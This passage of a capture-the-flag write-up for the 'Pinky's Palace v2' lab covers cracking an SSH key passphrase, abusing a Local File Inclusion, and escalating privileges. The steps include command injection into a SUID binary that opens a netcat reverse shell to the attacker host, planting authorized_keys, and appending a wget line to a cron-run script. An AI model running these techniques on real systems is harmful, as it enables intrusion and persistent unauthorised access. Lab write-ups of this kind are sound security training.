&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, we convert the private key to a format that john can crack it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/share/john/ssh2john.py id_rsa &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ssh.hash

root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john ssh.has &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSH
...
secretz101       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, That the password is found, we can log in via SSH to the target machine.&lt;/p&gt;

&lt;p&gt;To testing the parameter &lt;strong&gt;1337&lt;/strong&gt;, was found that it is vulnerable to Local File Inclusion.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;access-via-ssh&quot;&gt;Access via SSH&lt;/h3&gt;

&lt;p&gt;Before logging in, we need to grant the following permissions to the RSA private key.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;400 id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We access via SSH to the target machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh stefano@192.168.179.178 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4655 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa    
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'id_rsa'&lt;/span&gt;: 
Linux Pinkys-Palace 4.9.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64&lt;/span&gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;stefano&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;stefano&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;stefano&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the history file, from user stefano, there is a binary file that looks interesting.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stefano@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bash_history
...
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/local/bin
&lt;span class=&quot;nb&quot;&gt;ls
ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;backup.sh
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By listing the SUID binaries, was found the following binary in the stefano’s home directory, we will use it to escalate privileges as the user pinky.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stefano@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null 
&lt;span class=&quot;nt&quot;&gt;-rwsr----x&lt;/span&gt; 1 pinky www-data 13384 Mar 16  2018 /home/stefano/tools/qsub
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We execute the binary and it seems that it requires a message as input, in the same directory as the binary there is a note specifying that the program was made to send messages.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stefano@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/home/stefano/tools/qsub 
/home/stefano/tools/qsub &amp;lt;Message&amp;gt;
stefano@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tools/note.txt 
Pinky made me this program so I can easily send messages to him.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We cannot analyze the binary file on the victim machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stefano@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings /home/stefano/tools/qsub 
strings: /home/stefano/tools/qsub: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the best thing we can do is download it to the attacking machine, to do this I will use the discovered Local File Inclusion vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pinkysv2/screenshot-10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://pinkydb:7654/pageegap.php?1337&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/stefano/tools/qsub &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; qsub
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We give it execution privileges, using the strings command we see that the text displayed by echo is added to a file located in the pinky’s home directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x qsub
root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings qsub
...
/bin/echo %s &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /home/pinky/messages/stefano_msg.txt  
%s &amp;lt;Message&amp;gt;                                           
TERM                                              
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Input Password:                         
Bad hacker! Go away!                 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Welcome to Question Submit!    
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Incorrect Password!
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When analyzing the binary with ltrace we can see that the value of the environment variable &lt;strong&gt;$TERM&lt;/strong&gt; is used to compare with the password entered by the user, if they are the same, the message is sent otherwise it gives an error.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./qsub &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;getenv&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;TERM&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;screen&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Input Password: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20
__isoc99_scanf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x55bf60600cb5, 0x7ffd0b68dcd0, 0, 0[+] Input Password: password
&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
strlen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 8
strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;screen&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-3&lt;/span&gt;
puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[!] Incorrect Password!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Incorrect Password!
&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 24
&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
+++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./qsub &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;getenv&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;TERM&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;screen&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Input Password: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 20
__isoc99_scanf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x55b9ba000cb5, 0x7fffbc059980, 0, 0[+] Input Password: screen
&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
strlen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;screen&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 6
strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;screen&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;screen&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                           &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[+] Welcome to Question Submit!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 31
getegid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                                                                                            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
geteuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;                                                                                            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
setresgid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0, 0, 0, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
setresuid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0, 0, 0, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
asprintf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffbc059958, 0x55b9ba000c58, 0x7fffbc05b765, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 54
system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/echo test &amp;gt;&amp;gt; /home/pinky/me&quot;&lt;/span&gt;...sh: 1: cannot create /home/pinky/messages/stefano_msg.txt: Directory nonexistent
 &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGCHLD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Child exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
&amp;lt;... system resumed&amp;gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 512
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Welcome to Question Submit!+++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that we know how the binary works, we first need to start a netcat listener on port 443 in my case, and execute the following command on the target machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stefano@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/home/stefano/tools/qsub &lt;span class=&quot;s2&quot;&gt;&quot;;nc 192.168.179.1 443 -e /bin/bash&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Input Password: screen
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have a shell with pinky user privileges.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.178] 51210
script &lt;span class=&quot;nt&quot;&gt;-qc&lt;/span&gt; /bin/bash /dev/null
pinky@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pinky&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;stefano&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;stefano&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
pinky@Pinkys-Palace:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since we don’t have the necessary privileges to edit the backup file, one way to bypass this is accessing through SSH.&lt;/p&gt;

&lt;p&gt;We generate a pair of RSA keys.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pinkys123&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; pinky_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the target machine we create the .ssh directory and in it we create the &lt;strong&gt;authorized_keys&lt;/strong&gt; file that contains the public key, and grant all privileges to the owner of the file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pinky@Pinkys-Palace:/home/pinky&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .ssh
&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .ssh
pinky@Pinkys-Palace:/home/pinky&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXuRltyrlhrthbnt7stOvfbRJ7aTQhbZ2ps/NMT+PMYBKacQOQ3QsLqTCIZ7KfKHp2029+k/8FviS58Zoz6omP6RYhJ8E6Ayt0gUt0e5LKTKTocrvk4dsmK9Qo6EvhlBDet11yabRuXKrH1btxOIfyb8F06lQDodvefg/BBMIk5wwAKVO5/m5kK2uT5wShEZR0bbUdsBEXLMLvPZv9wbrcDDSX9xBzHkYr+adddqqXF+faqt6hfvBri03fEv5Kyb/Txwj7h6PhY5fq5mFdze4XaL0AAY58HLju6cZlQ6P8hIKsms7a5lh7TDo+tfudULt+fK+ZyoEzVXoaRLDlq1CPrioujhs8OTn6mB1tLNNjw2LJW0z/AJDs4evbOFkYmaB6C8QL2TdHxqrZNP4xZ3F7ao8QG6hfrnnyQoLrhnSnH8SQRC4/YyfudiFlph4sVbSpHiQq/byHwAuG42tkT5QEun+/tW1GeYkNgGrC58tRXzvQHLklFniWvvNl7qpEtK8='&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; .ssh/authorized_keys
&lt;span class=&quot;nv&quot;&gt;GrC58tRXzvQHLklFniWvvNl7qpEtK8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' &amp;gt; .ssh/authorized_keyswAuG42tkT5QEun+/tW1GeYkNgG
pinky@Pinkys-Palace:/home/pinky$ chmod 700 .ssh/authorized_keys
chmod 700 .ssh/authorized_keys
pinky@Pinkys-Palace:/home/pinky$
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We access via SSH as shown below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh pinky@192.168.179.178 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; pinky_rsa &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4655
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'pinky_rsa'&lt;/span&gt;: 
Linux Pinkys-Palace 4.9.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64&lt;/span&gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pinky@Pinkys-Palace:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we can edit the backup file, this is a script that is being executed by a cron job.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pinky@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/local/bin/backup.sh
&lt;span class=&quot;nt&quot;&gt;-rwxrwx---&lt;/span&gt; 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh
pinky@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/local/bin/backup.sh 
&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /home/demon/backups/backup.tar.gz
&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;cvzf /home/demon/backups/backup.tar.gz /var/www/html
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
pinky@Pinkys-Palace:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We add the following instructions to the backup.sh file, this creates the .ssh directory in the demon’s home directory, we download the public key and save it in the .ssh directory, and grant all permissions to the owner.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pinky@Pinkys-Palace:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mkdir /home/demon/.ssh &amp;amp;&amp;amp;\     
&amp;gt; wget 192.168.179.1/pinky_rsa.pub -O /home/demon/.ssh/authorized_keys &amp;amp;&amp;amp;\ 
&amp;gt; chmod 700 /home/demon/.ssh/authorized_keys'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /usr/local/bin/backup.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we start a python web server on port 80.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We wait a few minutes, and log in via SSH as user demon.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh demon@192.168.179.178 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; pinky_rsa &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4655
Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'pinky_rsa'&lt;/span&gt;: 
Linux Pinkys-Palace 4.9.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64&lt;/span&gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
demon@Pinkys-Palace:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

